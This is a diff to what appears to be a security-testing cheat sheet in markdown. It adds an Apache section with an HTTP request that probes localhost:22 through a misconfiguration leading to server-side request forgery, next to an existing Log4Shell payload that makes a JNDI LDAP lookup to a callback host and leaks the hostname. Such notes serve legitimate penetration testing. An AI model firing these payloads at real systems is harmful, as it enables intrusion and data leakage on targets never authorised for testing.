@@ -1672,9 +1672,11 @@ Resources:
 - [socialhunter](https://github.com/utkusen/socialhunter)
 
 
+
 ## Log4Shell
 
 - Payload: `Referer: ${jndi:ldap://h${hostname}.BURPCOLLABORATOR/s2test}`
+
 
 
 ## Spring Boot
@@ -1688,3 +1690,16 @@ Resources
 - [Memory Analyzer (MAT)](https://eclipse.dev/mat/) (for analyzing `/heapdump`)
 
 
+
+## Apache
+
+**Misconfiguration leading to SSRF**
+
+```
+GET http://localhost:22
+Host: redacted.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
+Accept: */*
+
+
+```
